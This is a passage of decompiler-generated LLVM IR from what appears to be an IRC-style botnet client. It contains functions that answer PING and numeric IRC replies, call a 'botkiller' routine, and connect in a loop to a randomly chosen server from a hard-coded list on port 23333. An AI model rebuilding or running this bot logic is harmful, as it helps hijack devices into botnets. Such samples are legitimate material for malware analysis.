  store i8 0, i8* %v3_9650, align 1
  %v1_9658 = add nuw i32 %stack_var_-24.022, 1
  %v2_9678 = load i8, i8* %v5_9670.pre-phi, align 1
  %v2_967c = icmp eq i8 %v2_9678, 0
  br i1 %v2_967c, label %dec_label_pc_9684, label %dec_label_pc_9560

dec_label_pc_9684:                                ; preds = %dec_label_pc_95c8, %dec_label_pc_9560, %dec_label_pc_9524
  %v7_9760 = load i32, i32* bitcast ([4 x i8]** @global_var_1d40c.318 to i32*), align 4
  %v2_9764 = icmp eq i32 %v7_9760, 0
  br i1 %v2_9764, label %dec_label_pc_976c, label %dec_label_pc_9690

dec_label_pc_9690:                                ; preds = %dec_label_pc_9684
  store i32 %v7_9760, i32* %r0.global-to-local, align 4
  %v2_96ac = inttoptr i32 %v7_9760 to i8*
  %v3_96ac = call i32 @__GI_strcasecmp(i8* %v2_96ac, i32 %v2_935c)
  store i32 %v3_96ac, i32* %r0.global-to-local, align 4
  %v2_96d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint ([4 x i8]** @global_var_1d40c.318 to i32), i32 4) to i32*), align 4
  store i32 %v2_96d4, i32* @r4, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 38652, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_96d4)
  %v5_974465 = icmp sgt i32 %stack_var_-28.2, 1
  br i1 %v5_974465, label %dec_label_pc_9708, label %dec_label_pc_976c

dec_label_pc_9708:                                ; preds = %dec_label_pc_9690, %dec_label_pc_9708
  %storemerge1666 = phi i32 [ %v1_9730, %dec_label_pc_9708 ], [ 1, %dec_label_pc_9690 ]
  %v3_9710 = mul i32 %storemerge1666, 4
  %v2_971c = add i32 %v2_9544, %v3_9710
  %v1_9720 = inttoptr i32 %v2_971c to i32*
  %v2_9720 = load i32, i32* %v1_9720, align 4
  store i32 %v2_9720, i32* @r0, align 4
  %v0_9728 = call i32 @free()
  store i32 %v0_9728, i32* %r0.global-to-local, align 4
  %v1_9730 = add nuw nsw i32 %storemerge1666, 1
  %v5_9744 = icmp slt i32 %v1_9730, %stack_var_-28.2
  br i1 %v5_9744, label %dec_label_pc_9708, label %dec_label_pc_976c

dec_label_pc_976c:                                ; preds = %dec_label_pc_9690, %dec_label_pc_9708, %dec_label_pc_9684, %dec_label_pc_93d0, %dec_label_pc_9338, %dec_label_pc_9310
  %v12_9770 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v12_9770

; uselistorder directives
  uselistorder i32 %v1_9730, { 1, 0 }
  uselistorder i32 %v7_9760, { 1, 0, 2 }
  uselistorder i32 %.pre30, { 1, 0 }
  uselistorder i32 %storemerge17, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i32 %v1_9564, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %stack_var_-24.022, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-28.2, { 3, 1, 2, 0 }
  uselistorder i32 %storemerge15, { 2, 0, 1 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v4_943c, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge14, { 2, 0, 1 }
  uselistorder i8* %stack_var_-32.0, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %.pre27, { 1, 0 }
  uselistorder i32 %storemerge13, { 1, 0, 3, 2 }
  uselistorder i32 %v1_937c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %storemerge12, { 1, 0, 3, 2 }
  uselistorder i32 %v4_92b4, { 1, 0 }
  uselistorder i8* %v3_92a4, { 1, 0 }
  uselistorder i8* %v3_9278, { 0, 2, 1 }
  uselistorder i32 %storemerge11, { 1, 2, 3, 0, 4 }
  uselistorder i8* %v3_925c, { 1, 0 }
  uselistorder i32 %v16_9228, { 2, 3, 0, 4, 1 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-1124, { 3, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 27, 2, 1, 4, 3, 7, 8, 9, 10, 12, 11, 15, 13, 14, 17, 16, 19, 18, 21, 20, 23, 22, 25, 24, 28, 26, 6, 5, 0 }
  uselistorder label %dec_label_pc_976c, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_9708, { 1, 0 }
  uselistorder label %dec_label_pc_9594, { 1, 0 }
  uselistorder label %dec_label_pc_9560, { 1, 0 }
  uselistorder label %dec_label_pc_9524, { 1, 0 }
  uselistorder label %dec_label_pc_94ec, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_94e0, { 1, 0 }
  uselistorder label %dec_label_pc_949c, { 1, 0 }
  uselistorder label %dec_label_pc_939c, { 1, 0 }
  uselistorder label %dec_label_pc_92dc, { 1, 0 }
  uselistorder label %dec_label_pc_9258, { 1, 0 }
}

define i32 @_376(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 38800, i32* %stack_var_-4, align 4
  %v2_978c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_978c, i32* @fp, align 4
  %v2_97a4 = load i32, i32* @global_var_1fe58.314, align 4
  %v4_97b4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_13308.321 to i32), i32 %v2_97a4)
  %v2_97bc = load i32, i32* @global_var_1fe70.301, align 4
  %v4_97d0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_13318.326 to i32), i32 %v2_97bc)
  %v2_97d8 = load i32, i32* @global_var_1fe58.314, align 4
  %v4_97e8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_13328.328 to i32), i32 %v2_97d8)
  ret i32 %v4_97e8

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @_PING(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 38936, i32* %stack_var_-4, align 4
  %v2_9814 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9814, i32* @fp, align 4
  %v4_9834 = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_13330.330 to i32), i32 %arg3)
  ret i32 %v4_9834

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @_352(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i8, align 1
  %stack_var_-52 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 38992, i32* %stack_var_-4, align 4
  %v2_984c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_984c, i32* @fp, align 4
  store i8* %arg3, i8** %stack_var_-52, align 4
  br label %dec_label_pc_9894.preheader

dec_label_pc_987c:                                ; preds = %dec_label_pc_98ac
  %v1_9880 = add i32 %.pre, 1
  %v5_9884 = inttoptr i32 %v1_9880 to i8*
  %v1_988c = add i32 %stack_var_-36.0, 1
  br label %dec_label_pc_9894

dec_label_pc_9894:                                ; preds = %dec_label_pc_9894.preheader, %dec_label_pc_987c
  %stack_var_-36.0 = phi i32 [ %v1_988c, %dec_label_pc_987c ], [ %stack_var_-36.119, %dec_label_pc_9894.preheader ]
  %stack_var_-28.0 = phi i8* [ %v5_9884, %dec_label_pc_987c ], [ %stack_var_-28.120, %dec_label_pc_9894.preheader ]
  %v3_9898 = load i8*, i8** %stack_var_-52, align 4
  %v3_989c = call i32 @strlen(i8* %v3_9898)
  %v3_98a4 = icmp ult i32 %stack_var_-36.0, %v3_989c
  %.pre = ptrtoint i8* %stack_var_-28.0 to i32
  br i1 %v3_98a4, label %dec_label_pc_98ac, label %dec_label_pc_98bc

dec_label_pc_98ac:                                ; preds = %dec_label_pc_9894
  %v2_98b0 = load i8, i8* %stack_var_-28.0, align 1
  %v7_98b4 = icmp eq i8 %v2_98b0, 32
  br i1 %v7_98b4, label %dec_label_pc_98bc, label %dec_label_pc_987c

dec_label_pc_98bc:                                ; preds = %dec_label_pc_9894, %dec_label_pc_98ac
  %v1_98c0 = add i32 %.pre, 1
  %v3_98cc = load i8*, i8** %stack_var_-52, align 4
  %v3_98d0 = call i32 @strlen(i8* %v3_98cc)
  %v9_98d8 = icmp eq i32 %stack_var_-36.0, %v3_98d0
  br i1 %v9_98d8, label %dec_label_pc_9b40, label %dec_label_pc_98e0

dec_label_pc_98e0:                                ; preds = %dec_label_pc_98bc
  %v5_98c4 = inttoptr i32 %v1_98c0 to i8*
  %v1_98e4 = add nuw nsw i32 %storemerge921, 1
  %v7_98f4 = icmp slt i32 %v1_98e4, 5
  br i1 %v7_98f4, label %dec_label_pc_9894.preheader, label %dec_label_pc_9910

dec_label_pc_9894.preheader:                      ; preds = %entry, %dec_label_pc_98e0
  %storemerge921 = phi i32 [ 0, %entry ], [ %v1_98e4, %dec_label_pc_98e0 ]
  %stack_var_-28.120 = phi i8* [ %arg3, %entry ], [ %v5_98c4, %dec_label_pc_98e0 ]
  %stack_var_-36.119 = phi i32 [ 0, %entry ], [ %stack_var_-36.0, %dec_label_pc_98e0 ]
  br label %dec_label_pc_9894

dec_label_pc_9904:                                ; preds = %dec_label_pc_9928
  %v1_9908 = add i32 %storemerge10, 1
  br label %dec_label_pc_9910

dec_label_pc_9910:                                ; preds = %dec_label_pc_98e0, %dec_label_pc_9904
  %storemerge10 = phi i32 [ %v1_9908, %dec_label_pc_9904 ], [ 0, %dec_label_pc_98e0 ]
  store i32 %storemerge10, i32* @r4, align 4
  %v3_9918 = call i32 @strlen(i8* %v5_98c4)
  %v0_9920 = load i32, i32* @r4, align 4
  %v3_9920 = icmp ult i32 %v0_9920, %v3_9918
  br i1 %v3_9920, label %dec_label_pc_9928, label %dec_label_pc_9910.dec_label_pc_9944_crit_edge

dec_label_pc_9910.dec_label_pc_9944_crit_edge:    ; preds = %dec_label_pc_9910
  %.pre27 = add i32 %storemerge10, %v1_98c0
  %.pre28 = inttoptr i32 %.pre27 to i8*
  br label %dec_label_pc_9944

dec_label_pc_9928:                                ; preds = %dec_label_pc_9910
  %v2_9934 = add i32 %storemerge10, %v1_98c0
  %v1_9938 = inttoptr i32 %v2_9934 to i8*
  %v2_9938 = load i8, i8* %v1_9938, align 1
  %v7_993c = icmp eq i8 %v2_9938, 32
  br i1 %v7_993c, label %dec_label_pc_9944, label %dec_label_pc_9904

dec_label_pc_9944:                                ; preds = %dec_label_pc_9928, %dec_label_pc_9910.dec_label_pc_9944_crit_edge
  %v3_9958.pre-phi = phi i8* [ %.pre28, %dec_label_pc_9910.dec_label_pc_9944_crit_edge ], [ %v1_9938, %dec_label_pc_9928 ]
  store i8 0, i8* %v3_9958.pre-phi, align 1
  %v2_9960 = load i32, i32* @global_var_1fe58.314, align 4
  %v4_996c = call i32 @__GI_strcasecmp(i8* %v5_98c4, i32 %v2_9960)
  %v2_9974 = icmp eq i32 %v4_996c, 0
  br i1 %v2_9974, label %dec_label_pc_997c, label %dec_label_pc_9b40

dec_label_pc_997c:                                ; preds = %dec_label_pc_9944
  %v2_9980 = load i32, i32* @global_var_1d7f8.333, align 4
  %v2_9984 = icmp eq i32 %v2_9980, 0
  br i1 %v2_9984, label %dec_label_pc_998c, label %dec_label_pc_9b40

dec_label_pc_998c:                                ; preds = %dec_label_pc_997c
  %v3_998c = load i8*, i8** %stack_var_-52, align 4
  br label %dec_label_pc_99c0.preheader

dec_label_pc_99a8:                                ; preds = %dec_label_pc_99d8
  %v1_99ac = add i32 %.pre29, 1
  %v5_99b0 = inttoptr i32 %v1_99ac to i8*
  %v1_99b8 = add i32 %stack_var_-36.2, 1
  br label %dec_label_pc_99c0

dec_label_pc_99c0:                                ; preds = %dec_label_pc_99c0.preheader, %dec_label_pc_99a8
  %stack_var_-36.2 = phi i32 [ %v1_99b8, %dec_label_pc_99a8 ], [ %stack_var_-36.316, %dec_label_pc_99c0.preheader ]
  %stack_var_-28.2 = phi i8* [ %v5_99b0, %dec_label_pc_99a8 ], [ %stack_var_-28.317, %dec_label_pc_99c0.preheader ]
  %v3_99c4 = load i8*, i8** %stack_var_-52, align 4
  %v3_99c8 = call i32 @strlen(i8* %v3_99c4)
  %v3_99d0 = icmp ult i32 %stack_var_-36.2, %v3_99c8
  %.pre29 = ptrtoint i8* %stack_var_-28.2 to i32
  br i1 %v3_99d0, label %dec_label_pc_99d8, label %dec_label_pc_99e8

dec_label_pc_99d8:                                ; preds = %dec_label_pc_99c0
  %v2_99dc = load i8, i8* %stack_var_-28.2, align 1
  %v7_99e0 = icmp eq i8 %v2_99dc, 32
  br i1 %v7_99e0, label %dec_label_pc_99e8, label %dec_label_pc_99a8

dec_label_pc_99e8:                                ; preds = %dec_label_pc_99c0, %dec_label_pc_99d8
  %v1_99ec = add i32 %.pre29, 1
  %v3_99f8 = load i8*, i8** %stack_var_-52, align 4
  %v3_99fc = call i32 @strlen(i8* %v3_99f8)
  %v9_9a04 = icmp eq i32 %stack_var_-36.2, %v3_99fc
  br i1 %v9_9a04, label %dec_label_pc_9b40, label %dec_label_pc_9a0c

dec_label_pc_9a0c:                                ; preds = %dec_label_pc_99e8
  %v5_99f0 = inttoptr i32 %v1_99ec to i8*
  %v1_9a10 = add nuw nsw i32 %storemerge1118, 1
  %v7_9a20 = icmp slt i32 %v1_9a10, 3
  br i1 %v7_9a20, label %dec_label_pc_99c0.preheader, label %dec_label_pc_9a3c

dec_label_pc_99c0.preheader:                      ; preds = %dec_label_pc_998c, %dec_label_pc_9a0c
  %storemerge1118 = phi i32 [ 0, %dec_label_pc_998c ], [ %v1_9a10, %dec_label_pc_9a0c ]
  %stack_var_-28.317 = phi i8* [ %v3_998c, %dec_label_pc_998c ], [ %v5_99f0, %dec_label_pc_9a0c ]
  %stack_var_-36.316 = phi i32 [ 0, %dec_label_pc_998c ], [ %stack_var_-36.2, %dec_label_pc_9a0c ]
  br label %dec_label_pc_99c0

dec_label_pc_9a30:                                ; preds = %dec_label_pc_9a54
  %v1_9a34 = add i32 %storemerge12, 1
  br label %dec_label_pc_9a3c

dec_label_pc_9a3c:                                ; preds = %dec_label_pc_9a0c, %dec_label_pc_9a30
  %storemerge12 = phi i32 [ %v1_9a34, %dec_label_pc_9a30 ], [ 0, %dec_label_pc_9a0c ]
  store i32 %storemerge12, i32* @r4, align 4
  %v3_9a44 = call i32 @strlen(i8* %v5_99f0)
  %v0_9a4c = load i32, i32* @r4, align 4
  %v3_9a4c = icmp ult i32 %v0_9a4c, %v3_9a44
  br i1 %v3_9a4c, label %dec_label_pc_9a54, label %dec_label_pc_9a3c.dec_label_pc_9a70_crit_edge

dec_label_pc_9a3c.dec_label_pc_9a70_crit_edge:    ; preds = %dec_label_pc_9a3c
  %.pre30 = add i32 %storemerge12, %v1_99ec
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_9a70

dec_label_pc_9a54:                                ; preds = %dec_label_pc_9a3c
  %v2_9a60 = add i32 %storemerge12, %v1_99ec
  %v1_9a64 = inttoptr i32 %v2_9a60 to i8*
  %v2_9a64 = load i8, i8* %v1_9a64, align 1
  %v7_9a68 = icmp eq i8 %v2_9a64, 32
  br i1 %v7_9a68, label %dec_label_pc_9a70, label %dec_label_pc_9a30

dec_label_pc_9a70:                                ; preds = %dec_label_pc_9a54, %dec_label_pc_9a3c.dec_label_pc_9a70_crit_edge
  %v3_9a84.pre-phi = phi i8* [ %.pre31, %dec_label_pc_9a3c.dec_label_pc_9a70_crit_edge ], [ %v1_9a64, %dec_label_pc_9a54 ]
  store i8 0, i8* %v3_9a84.pre-phi, align 1
  store i32 %v1_99ec, i32* @r0, align 4
  %v2_9a8c = call i32 @inet_addr(i32 %v1_99ec)
  %v5_9a94 = trunc i32 %v2_9a8c to i8
  store i8 %v5_9a94, i8* %stack_var_-40, align 1
  %v3_9a9c = icmp eq i8 %v5_9a94, -1
  br i1 %v3_9a9c, label %dec_label_pc_9aa4, label %dec_label_pc_9ae4

dec_label_pc_9aa4:                                ; preds = %dec_label_pc_9a70
  %v2_9aa8 = call i32 @__GI_gethostbyname(i32 %v1_99ec)
  %v2_9ab8 = icmp eq i32 %v2_9aa8, 0
  br i1 %v2_9ab8, label %dec_label_pc_9b40, label %dec_label_pc_9ac0

dec_label_pc_9ac0:                                ; preds = %dec_label_pc_9aa4
  %v2_9ac0 = ptrtoint i8* %stack_var_-40 to i32
  %v1_9ac8 = add i32 %v2_9aa8, 16
  %v2_9ac8 = inttoptr i32 %v1_9ac8 to i32*
  %v3_9ac8 = load i32, i32* %v2_9ac8, align 4
  %v1_9acc = inttoptr i32 %v3_9ac8 to i32*
  %v2_9acc = load i32, i32* %v1_9acc, align 4
  store i32 %v2_9acc, i32* @r1, align 4
  %v1_9ad4 = add i32 %v2_9aa8, 12
  %v2_9ad4 = inttoptr i32 %v1_9ad4 to i32*
  %v3_9ad4 = load i32, i32* %v2_9ad4, align 4
  store i32 %v2_9ac0, i32* @r0, align 4
  store i32 %v3_9ad4, i32* @r2, align 4
  %v0_9ae0 = call i32 @memcpy()
  %v2_9af0.pre = load i8, i8* %stack_var_-40, align 1
  br label %dec_label_pc_9ae4

dec_label_pc_9ae4:                                ; preds = %dec_label_pc_9a70, %dec_label_pc_9ac0
  %v12_9b4426 = phi i32 [ %v0_9ae0, %dec_label_pc_9ac0 ], [ %v2_9a8c, %dec_label_pc_9a70 ]
  %v2_9af0 = phi i8 [ %v2_9af0.pre, %dec_label_pc_9ac0 ], [ %v5_9a94, %dec_label_pc_9a70 ]
  store i8 %v2_9af0, i8* bitcast (i8** @global_var_1d7f7.336 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_1d7f4.335 to i8*), align 4
  store i32 256, i32* @global_var_1d7f8.333, align 4
  br label %dec_label_pc_9b40

dec_label_pc_9b40:                                ; preds = %dec_label_pc_98bc, %dec_label_pc_99e8, %dec_label_pc_997c, %dec_label_pc_9944, %dec_label_pc_9aa4, %dec_label_pc_9ae4
  %v12_9b44 = phi i32 [ 0, %dec_label_pc_997c ], [ %v4_996c, %dec_label_pc_9944 ], [ 0, %dec_label_pc_9aa4 ], [ %v12_9b4426, %dec_label_pc_9ae4 ], [ %v3_99fc, %dec_label_pc_99e8 ], [ %v3_98d0, %dec_label_pc_98bc ]
  ret i32 %v12_9b44

; uselistorder directives
  uselistorder i32 %storemerge12, { 1, 0, 3, 2 }
  uselistorder i32 %v1_9a10, { 1, 0 }
  uselistorder i32 %v1_99ec, { 2, 4, 3, 0, 1, 5 }
  uselistorder i8* %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %stack_var_-36.2, { 2, 0, 1, 3 }
  uselistorder i32 %storemerge10, { 1, 0, 3, 2 }
  uselistorder i32 %v1_98e4, { 1, 0 }
  uselistorder i8* %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %stack_var_-36.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-52, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_9b40, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_9ae4, { 1, 0 }
  uselistorder label %dec_label_pc_9a3c, { 1, 0 }
  uselistorder label %dec_label_pc_99c0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_99e8, { 1, 0 }
  uselistorder label %dec_label_pc_9910, { 1, 0 }
  uselistorder label %dec_label_pc_9894.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_98bc, { 1, 0 }
}

define i32 @_433(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-74 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 39776, i32* %stack_var_-4, align 4
  %v2_9b5c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9b5c, i32* @fp, align 4
  %v2_9b74 = load i32, i32* @global_var_1fe58.314, align 4
  store i32 %v2_9b74, i32* @r0, align 4
  %v0_9b7c = call i32 @free()
  %v1_9b88 = call i32 @makestring(i32 %v0_9b7c)
  %v2_9b94 = ptrtoint i32* %stack_var_-74 to i32
  %v4_9ba0 = call i32 @strcpy(i32 %v2_9b94, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1333c.341, i32 0, i32 0))
  store i32 %v1_9b88, i32* @r1, align 4
  %v2_9bb0 = bitcast i32* %stack_var_-74 to i8*
  %v3_9bb0 = call i32 @strcat(i8* %v2_9bb0, i32 %v1_9b88)
  store i32 %v2_9b94, i32* @global_var_1fe58.314, align 4
  %v1_9bc0 = call i32 @botkiller(i32 %v3_9bb0)
  ret i32 %v1_9bc0

; uselistorder directives
  uselistorder i32 %v1_9b88, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @con() local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_9bd8 = load i32, i32* @fp, align 4
  store i32 39904, i32* %stack_var_-4, align 4
  %v2_9bdc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9bdc, i32* @fp, align 4
  %v2_9d04 = ptrtoint i32* %stack_var_-40 to i32
  %v2_9d70 = ptrtoint i32* %stack_var_-48 to i32
  %v3_9dc0 = bitcast i32* %stack_var_-44 to %sockaddr*
  br label %dec_label_pc_9be8

dec_label_pc_9be8:                                ; preds = %dec_label_pc_9be8.backedge, %entry
  store i32 -1, i32* @global_var_1fe5c.343, align 4
  store i32 1, i32* %stack_var_-48, align 4
  %v2_9c00 = load i32, i32* @global_var_1d7ec.345, align 4
  %v2_9c04 = icmp eq i32 %v2_9c00, 0
  br i1 %v2_9c04, label %dec_label_pc_9c0c, label %dec_label_pc_9c40

dec_label_pc_9c0c:                                ; preds = %dec_label_pc_9be8
  %v0_9c0c = call i32 @random()
  %v2_9c18 = load i32, i32* @global_var_1d3fc.347, align 4
  %v2_9c24 = srem i32 %v0_9c0c, %v2_9c18
  %v4_9c34 = mul i32 %v2_9c24, 4
  %v5_9c34 = add i32 %v4_9c34, ptrtoint ([22 x i8]** @global_var_1d400.350 to i32)
  %v6_9c34 = inttoptr i32 %v5_9c34 to i32*
  %v7_9c34 = load i32, i32* %v6_9c34, align 4
  store i32 %v7_9c34, i32* @global_var_1fe64.352, align 4
  br label %dec_label_pc_9c40

dec_label_pc_9c40:                                ; preds = %dec_label_pc_9be8, %dec_label_pc_9c0c
  store i32 0, i32* @global_var_1d7ec.345, align 4
  br label %dec_label_pc_9c4c

dec_label_pc_9c4c:                                ; preds = %dec_label_pc_9c4c, %dec_label_pc_9c40
  %v0_9c58 = call i32 @socket()
  store i32 %v0_9c58, i32* @global_var_1fe5c.343, align 4
  %v1_9c70 = icmp slt i32 %v0_9c58, 0
  br i1 %v1_9c70, label %dec_label_pc_9c4c, label %dec_label_pc_9c78

dec_label_pc_9c78:                                ; preds = %dec_label_pc_9c4c
  %v2_9c7c = load i32, i32* @global_var_1fe64.352, align 4
  store i32 %v2_9c7c, i32* @r0, align 4
  %v1_9c84 = call i32 @inet_addr(i32 %v2_9c7c)
  %v2_9c8c = icmp eq i32 %v1_9c84, 0
  br i1 %v2_9c8c, label %dec_label_pc_9cb0, label %dec_label_pc_9c94

dec_label_pc_9c94:                                ; preds = %dec_label_pc_9c78
  %v2_9c98 = load i32, i32* @global_var_1fe64.352, align 4
  store i32 %v2_9c98, i32* @r0, align 4
  %v1_9ca0 = call i32 @inet_addr(i32 %v2_9c98)
  %v3_9ca8 = icmp eq i32 %v1_9ca0, -1
  br i1 %v3_9ca8, label %dec_label_pc_9cb0, label %dec_label_pc_9d24

dec_label_pc_9cb0:                                ; preds = %dec_label_pc_9c94, %dec_label_pc_9c78
  %v2_9cb4 = load i32, i32* @global_var_1fe64.352, align 4
  %v1_9cbc = call i32 @__GI_gethostbyname(i32 %v2_9cb4)
  %v2_9ccc = icmp eq i32 %v1_9cbc, 0
  br i1 %v2_9ccc, label %dec_label_pc_9cd4, label %dec_label_pc_9cf4

dec_label_pc_9cd4:                                ; preds = %dec_label_pc_9cb0
  store i32 0, i32* @global_var_1fe64.352, align 4
  %v2_9ce4 = load i32, i32* @global_var_1fe5c.343, align 4
  %v1_9cec = call i32 @__libc_close(i32 %v2_9ce4)
  br label %dec_label_pc_9be8.backedge

dec_label_pc_9be8.backedge:                       ; preds = %dec_label_pc_9cd4, %dec_label_pc_9ea4
  br label %dec_label_pc_9be8

dec_label_pc_9cf4:                                ; preds = %dec_label_pc_9cb0
  %v1_9cf8 = add i32 %v1_9cbc, 16
  %v2_9cf8 = inttoptr i32 %v1_9cf8 to i32*
  %v3_9cf8 = load i32, i32* %v2_9cf8, align 4
  %v1_9cfc = inttoptr i32 %v3_9cf8 to i32*
  %v2_9cfc = load i32, i32* %v1_9cfc, align 4
  %v1_9d0c = add i32 %v1_9cbc, 12
  %v2_9d0c = inttoptr i32 %v1_9d0c to i32*
  %v3_9d0c = load i32, i32* %v2_9d0c, align 4
  store i32 %v3_9d0c, i32* @r2, align 4
  %v3_9d1c = call i32 @bcopy(i32 %v2_9cfc, i32 %v2_9d04, i32 %v3_9d0c)
  br label %dec_label_pc_9d3c

dec_label_pc_9d24:                                ; preds = %dec_label_pc_9c94
  %v2_9d28 = load i32, i32* @global_var_1fe64.352, align 4
  store i32 %v2_9d28, i32* @r0, align 4
  %v1_9d30 = call i32 @inet_addr(i32 %v2_9d28)
  store i32 %v1_9d30, i32* %stack_var_-40, align 4
  br label %dec_label_pc_9d3c

dec_label_pc_9d3c:                                ; preds = %dec_label_pc_9cf4, %dec_label_pc_9d24
  store i32 2, i32* %stack_var_-44, align 4
  %v1_9d54 = call i32 @htons(i32 23333)
  %v2_9d6c = load i32, i32* @global_var_1fe5c.343, align 4
  %v3_9d80 = call i32 @ioctl(i32 %v2_9d6c, i32 21537, i32 %v2_9d70)
  %v2_9d88 = call i32 @__GI_time(i32* null)
  br label %dec_label_pc_9e84

dec_label_pc_9d98:                                ; preds = %dec_label_pc_9e84
  %v0_9d98 = call i32 @__errno_location()
  %v2_9da4 = inttoptr i32 %v0_9d98 to i32*
  store i32 0, i32* %v2_9da4, align 4
  %v2_9dac = load i32, i32* @global_var_1fe5c.343, align 4
  %v4_9dc0 = call i32 @__libc_connect(i32 %v2_9dac, %sockaddr* %v3_9dc0, i32 16)
  %v2_9dc8 = icmp eq i32 %v4_9dc0, 0
  br i1 %v2_9dc8, label %dec_label_pc_9de4, label %dec_label_pc_9dd0

dec_label_pc_9dd0:                                ; preds = %dec_label_pc_9d98
  %v0_9dd0 = call i32 @__errno_location()
  %v1_9dd8 = inttoptr i32 %v0_9dd0 to i32*
  %v2_9dd8 = load i32, i32* %v1_9dd8, align 4
  %v7_9ddc = icmp eq i32 %v2_9dd8, 106
  br i1 %v7_9ddc, label %dec_label_pc_9de4, label %dec_label_pc_9e54

dec_label_pc_9de4:                                ; preds = %dec_label_pc_9dd0, %dec_label_pc_9d98
  %v2_9de8 = load i32, i32* @global_var_1fe5c.343, align 4
  %v6_9e04 = call i32 @__GI_setsockopt(i32 %v2_9de8, i32 1, i32 13, i32* null, i32 0)
  %v2_9e0c = load i32, i32* @global_var_1fe5c.343, align 4
  %v6_9e28 = call i32 @__GI_setsockopt(i32 %v2_9e0c, i32 1, i32 2, i32* null, i32 0)
  %v2_9e30 = load i32, i32* @global_var_1fe5c.343, align 4
  %v6_9e4c = call i32 @__GI_setsockopt(i32 %v2_9e30, i32 1, i32 9, i32* null, i32 0)
  store i32 %v3_9bd8, i32* @fp, align 4
  ret i32 %v6_9e4c

dec_label_pc_9e54:                                ; preds = %dec_label_pc_9dd0
  %v0_9e54 = call i32 @__errno_location()
  %v1_9e5c = inttoptr i32 %v0_9e54 to i32*
  %v2_9e5c = load i32, i32* %v1_9e5c, align 4
  %v7_9e60 = icmp eq i32 %v2_9e5c, 115
  br i1 %v7_9e60, label %dec_label_pc_9e7c, label %dec_label_pc_9e68

dec_label_pc_9e68:                                ; preds = %dec_label_pc_9e54
  %v0_9e68 = call i32 @__errno_location()
  %v1_9e70 = inttoptr i32 %v0_9e68 to i32*
  %v2_9e70 = load i32, i32* %v1_9e70, align 4
  %v7_9e74 = icmp eq i32 %v2_9e70, 114
  br i1 %v7_9e74, label %dec_label_pc_9e7c, label %dec_label_pc_9ea4

dec_label_pc_9e7c:                                ; preds = %dec_label_pc_9e68, %dec_label_pc_9e54
  %v1_9e80 = call i32 @sleep(i32 1)
  br label %dec_label_pc_9e84

dec_label_pc_9e84:                                ; preds = %dec_label_pc_9d3c, %dec_label_pc_9e7c
  %v2_9e88 = call i32 @__GI_time(i32* null)
  %v2_9e98 = sub i32 %v2_9e88, %v2_9d88
  %tmp = icmp ult i32 %v2_9e98, 10
  br i1 %tmp, label %dec_label_pc_9d98, label %dec_label_pc_9ea4

dec_label_pc_9ea4:                                ; preds = %dec_label_pc_9e68, %dec_label_pc_9e84
  store i32 0, i32* @global_var_1fe64.352, align 4
  %v2_9eb4 = load i32, i32* @global_var_1fe5c.343, align 4
  %v1_9ebc = call i32 @__libc_close(i32 %v2_9eb4)
  br label %dec_label_pc_9be8.backedge

; uselistorder directives
  uselistorder i32 %v3_9d0c, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 (i32)* @htons, { 1, 0 }
